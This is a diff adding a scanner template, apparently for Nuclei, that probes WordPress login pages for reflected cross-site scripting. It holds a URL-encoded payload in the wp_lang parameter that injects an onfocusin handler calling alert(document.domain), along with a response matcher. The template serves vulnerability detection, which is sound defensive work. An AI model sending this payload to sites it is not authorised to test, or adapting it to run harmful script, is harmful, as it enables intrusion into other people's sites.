@@ -1,0 +1,15 @@
+id: wp-login-xss
+info:
+  name: WordPress Login XSS
+  author: pdteam
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-login.php?wp_lang=en_US%27%22%20id=x%20tabindex=1%20on%3C!%3Efocusin=alert(document.domain)%3E"
+    matchers:
+      - type: word
+        words:
+          - "<input id=\"x\" tabindex=\"1\" onfocusin=\"alert(document.domain)\">"
+        part: body
